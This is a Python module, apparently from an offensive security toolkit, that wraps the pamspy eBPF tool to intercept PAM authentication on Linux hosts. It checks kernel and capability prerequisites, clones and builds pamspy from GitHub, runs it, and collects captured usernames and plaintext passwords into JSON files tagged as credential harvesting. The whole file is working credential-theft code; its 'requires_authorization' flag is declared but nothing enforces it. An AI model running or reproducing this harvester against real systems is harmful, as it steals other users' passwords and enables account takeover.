"""Bridge for pamspy eBPF credential harvester: intercept PAM authentication.

Source: https://github.com/citronneur/pamspy
License: Apache-2.0
SRC-ID: SRC-1037
Category: eBPF credential harvesting, PAM hooking, password interception
"""

import json
import os
import platform
import re
import shutil
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.k8s.pamspy_bridge.v1",
    "safety_class": "BRIDGE",
    "requires_authorization": True,
    "side_effects": [
        "loads_ebpf_programs",
        "intercepts_pam_credentials",
        "captures_passwords",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003", "T1056.001"],
}

_REPO_URL = "https://github.com/citronneur/pamspy"

# Credential output format from pamspy
# Each line: timestamp|username|password|service|tty
_CRED_PATTERN = re.compile(
    r"^(?P<timestamp>[^\|]+)\|"
    r"(?P<username>[^\|]+)\|"
    r"(?P<password>[^\|]+)\|"
    r"(?P<service>[^\|]*)\|"
    r"(?P<tty>[^\|]*)$"
)


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _check_prerequisites() -> dict[str, Any]:
    """Verify kernel BPF support and PAM presence."""
    info: dict[str, Any] = {
        "kernel": platform.release(),
        "arch": platform.machine(),
        "errors": [],
        "warnings": [],
    }

    # Kernel version (need >= 5.8)
    try:
        parts = platform.release().split(".")
        major, minor = int(parts[0]), int(parts[1])
        if major < 5 or (major == 5 and minor < 8):
            info["errors"].append(
                f"Kernel {major}.{minor} too old; pamspy needs >= 5.8"
            )
    except (ValueError, IndexError):
        info["warnings"].append("Could not parse kernel version")

    # BTF
    if not Path("/sys/kernel/btf/vmlinux").exists():
        info["errors"].append("BTF vmlinux not found: CONFIG_DEBUG_INFO_BTF required")

    # Capabilities
    try:
        status = Path("/proc/self/status").read_text()
        for line in status.splitlines():
            if line.startswith("CapEff:"):
                cap_hex = int(line.split(":")[1].strip(), 16)
                cap_sys_admin = 1 << 21
                cap_bpf = 1 << 39
                if not (cap_hex & cap_sys_admin) and not (cap_hex & cap_bpf):
                    info["errors"].append("CAP_SYS_ADMIN or CAP_BPF required")
                break
    except OSError:
        info["errors"].append("Cannot read /proc/self/status")

    # PAM library presence
    pam_lib = _find_pam_library()
    if pam_lib:
        info["pam_library"] = pam_lib
    else:
        info["errors"].append("libpam.so not found on system")

    # Check pam_get_authtok symbol
    if pam_lib:
        symbol_check = _check_pam_symbol(pam_lib)
        if not symbol_check["found"]:
            info["errors"].append(
                f"pam_get_authtok symbol not found in {pam_lib}"
            )
        else:
            info["pam_symbol_offset"] = symbol_check.get("offset")

    info["prerequisites_met"] = len(info["errors"]) == 0
    return info


def _find_pam_library() -> str | None:
    """Locate libpam.so on the system."""
    candidates = [
        "/lib/x86_64-linux-gnu/libpam.so.0",
        "/lib64/libpam.so.0",
        "/usr/lib/libpam.so.0",
        "/usr/lib64/libpam.so.0",
        "/lib/libpam.so.0",
        "/lib/aarch64-linux-gnu/libpam.so.0",
    ]

    for candidate in candidates:
        if os.path.isfile(candidate):
            return candidate

    # Fall back to ldconfig query
    try:
        proc = subprocess.run(
            ["ldconfig", "-p"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        for line in proc.stdout.splitlines():
            if "libpam.so" in line and "=>" in line:
                path = line.split("=>")[-1].strip()
                if os.path.isfile(path):
                    return path
    except (OSError, subprocess.TimeoutExpired):
        pass

    return None


def _check_pam_symbol(pam_lib: str) -> dict[str, Any]:
    """Check for pam_get_authtok symbol in libpam."""
    result: dict[str, Any] = {"found": False, "offset": None}

    nm_bin = shutil.which("nm")
    if nm_bin:
        try:
            proc = subprocess.run(
                [nm_bin, "-D", pam_lib],
                capture_output=True,
                text=True,
                timeout=10,
            )
            for line in proc.stdout.splitlines():
                if "pam_get_authtok" in line:
                    parts = line.split()
                    if len(parts) >= 1:
                        try:
                            result["offset"] = parts[0]
                        except (ValueError, IndexError):
                            pass
                    result["found"] = True
                    return result
        except (OSError, subprocess.TimeoutExpired):
            pass

    # Fallback: readelf
    readelf_bin = shutil.which("readelf")
    if readelf_bin:
        try:
            proc = subprocess.run(
                [readelf_bin, "-s", "--wide", pam_lib],
                capture_output=True,
                text=True,
                timeout=10,
            )
            for line in proc.stdout.splitlines():
                if "pam_get_authtok" in line:
                    result["found"] = True
                    parts = line.split()
                    if len(parts) >= 2:
                        result["offset"] = parts[1]
                    return result
        except (OSError, subprocess.TimeoutExpired):
            pass

    return result


def _find_pamspy_binary(args: Any) -> str | None:
    """Locate compiled pamspy binary."""
    custom = getattr(args, "pamspy_path", None)
    if custom and os.path.isfile(custom) and os.access(custom, os.X_OK):
        return custom

    found = shutil.which("pamspy")
    if found:
        return found

    for candidate in [
        "/opt/pamspy/pamspy",
        os.path.expanduser("~/pamspy/src/pamspy"),
        "/tmp/pamspy-build/pamspy/src/pamspy",
    ]:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate

    return None


def _build_from_source(args: Any) -> dict[str, Any]:
    """Clone and build pamspy from source."""
    build_dir = getattr(args, "build_dir", "/tmp/pamspy-build")
    result: dict[str, Any] = {"success": False, "binary": None, "log": []}

    for tool in ["make", "clang", "llvm-strip"]:
        if not shutil.which(tool):
            result["log"].append(f"Required build tool not found: {tool}")
            return result

    os.makedirs(build_dir, exist_ok=True)
    src_dir = os.path.join(build_dir, "pamspy")

    if not os.path.isdir(src_dir):
        clone_cmd = ["git", "clone", "--depth", "1", _REPO_URL, src_dir]
        proc = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode != 0:
            result["log"].append(f"git clone failed: {proc.stderr.strip()}")
            return result
        result["log"].append("Repository cloned")

    make_dir = os.path.join(src_dir, "src")
    proc = subprocess.run(
        ["make"],
        capture_output=True,
        text=True,
        timeout=180,
        cwd=make_dir,
    )

    if proc.returncode != 0:
        result["log"].append(f"Build failed: {proc.stderr.strip()}")
        return result

    binary = os.path.join(make_dir, "pamspy")
    if os.path.isfile(binary):
        result["success"] = True
        result["binary"] = binary
        result["log"].append(f"Build succeeded: {binary}")
    else:
        result["log"].append("Build completed but pamspy binary not found")

    return result


def _parse_credential_line(line: str) -> dict[str, str] | None:
    """Parse a single pamspy credential output line."""
    match = _CRED_PATTERN.match(line.strip())
    if match:
        return match.groupdict()

    # Try space-separated format (alternative pamspy output)
    parts = line.strip().split()
    if len(parts) >= 3:
        return {
            "timestamp": datetime.now(UTC).isoformat(),
            "username": parts[0] if len(parts) > 0 else "",
            "password": parts[1] if len(parts) > 1 else "",
            "service": parts[2] if len(parts) > 2 else "",
            "tty": parts[3] if len(parts) > 3 else "",
        }
    return None


def _start_capture(binary: str, args: Any) -> dict[str, Any]:
    """Start pamspy credential capture."""
    cmd = [binary]

    pam_lib = getattr(args, "pam_library", None)
    if pam_lib:
        cmd.extend(["-p", pam_lib])
    else:
        default_lib = _find_pam_library()
        if default_lib:
            cmd.extend(["-p", default_lib])

    print(f"[*] Starting pamspy: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        import select

        ready, _, _ = select.select([proc.stdout], [], [], 3.0)
        initial = ""
        if ready:
            initial = proc.stdout.readline()

        return {
            "success": True,
            "pid": proc.pid,
            "command": " ".join(cmd),
            "initial_output": initial.strip(),
        }
    except OSError as exc:
        return {"success": False, "error": str(exc)}


def _collect_credentials(binary: str, args: Any, duration: int = 30) -> dict[str, Any]:
    """Run pamspy for a specified duration and collect captured credentials."""
    cmd = [binary]

    pam_lib = getattr(args, "pam_library", None) or _find_pam_library()
    if pam_lib:
        cmd.extend(["-p", pam_lib])

    print(f"[*] Collecting credentials for {duration}s: {' '.join(cmd)}")

    credentials: list[dict[str, str]] = []

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        import select
        import time

        deadline = time.monotonic() + duration

        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break

            ready, _, _ = select.select([proc.stdout], [], [], min(remaining, 1.0))
            if ready:
                line = proc.stdout.readline()
                if not line:
                    break
                cred = _parse_credential_line(line)
                if cred:
                    credentials.append(cred)
                    print(
                        f"[+] Captured: user={cred['username']} "
                        f"service={cred.get('service', 'N/A')} "
                        f"tty={cred.get('tty', 'N/A')}"
                    )

        # Stop capture
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

        return {
            "success": True,
            "credentials_captured": len(credentials),
            "credentials": credentials,
            "duration_seconds": duration,
        }
    except OSError as exc:
        return {"success": False, "error": str(exc), "credentials": []}


def run(args: Any) -> int:
    """Execute pamspy_bridge module.

    Supported actions (via args.action):
        check    - Verify prerequisites (kernel, BPF, PAM, symbol)
        build    - Build pamspy from source
        start    - Start credential capture daemon
        collect  - Capture credentials for a duration (--duration seconds)
    """
    action = getattr(args, "action", "check")
    print(f"[*] {MANIFEST['capability_id']} - pamspy eBPF credential harvester bridge")
    print(f"[*] Action: {action}")

    results: dict[str, Any] = {
        "module": "pamspy_bridge",
        "action": action,
        "findings": [],
        "summary": {},
    }

    prereqs = _check_prerequisites()
    results["prerequisites"] = prereqs

    if action == "check":
        binary = _find_pamspy_binary(args)
        results["pamspy_binary"] = binary
        results["status"] = "completed"

        if prereqs["prerequisites_met"]:
            print("[+] All prerequisites verified")
            if prereqs.get("pam_library"):
                print(f"[+] PAM library: {prereqs['pam_library']}")
            if prereqs.get("pam_symbol_offset"):
                print(f"[+] pam_get_authtok offset: {prereqs['pam_symbol_offset']}")
        else:
            print(f"[-] Issues: {'; '.join(prereqs['errors'])}")

        if binary:
            print(f"[+] pamspy binary: {binary}")
        else:
            print("[!] pamspy not found; use 'build' action or set --pamspy-path")

        _save(args, "k8s_pamspy_check", results)
        return 0

    if action == "build":
        build_result = _build_from_source(args)
        results["build"] = build_result
        results["status"] = "completed" if build_result["success"] else "build_failed"
        for msg in build_result["log"]:
            print(f"[*] {msg}")
        _save(args, "k8s_pamspy_build", results)
        return 0 if build_result["success"] else 1

    # Actions requiring BPF
    if not prereqs["prerequisites_met"]:
        print("[-] Cannot proceed: prerequisites not met", file=sys.stderr)
        results["status"] = "prereq_failed"
        _save(args, "k8s_pamspy_error", results)
        return 1

    binary = _find_pamspy_binary(args)
    if not binary:
        print("[-] pamspy binary not found", file=sys.stderr)
        results["status"] = "binary_not_found"
        _save(args, "k8s_pamspy_error", results)
        return 1

    if action == "start":
        start_result = _start_capture(binary, args)
        results["capture"] = start_result
        results["status"] = "running" if start_result["success"] else "failed"

        if start_result["success"]:
            print(f"[+] pamspy started (PID: {start_result['pid']})")
            results["findings"].append({
                "type": "credential_capture_started",
                "pid": start_result["pid"],
                "mitre": "T1056.001",
            })
        else:
            print(f"[-] Failed: {start_result.get('error')}")

        _save(args, "k8s_pamspy_start", results)
        return 0 if start_result["success"] else 1

    if action == "collect":
        duration = int(getattr(args, "duration", 30))
        collect_result = _collect_credentials(binary, args, duration)
        results["collection"] = collect_result
        results["status"] = "completed"

        captured = collect_result.get("credentials_captured", 0)
        print(f"[+] Collection finished: {captured} credential(s) captured")

        if captured > 0:
            results["findings"].append({
                "type": "credentials_harvested",
                "count": captured,
                "mitre": "T1003",
                "services": list({
                    c.get("service", "unknown") for c in collect_result.get("credentials", [])
                }),
            })

        _save(args, "k8s_pamspy_collect", results)
        return 0

    print(f"[-] Unknown action: {action}", file=sys.stderr)
    results["status"] = "unknown_action"
    _save(args, "k8s_pamspy_error", results)
    return 1
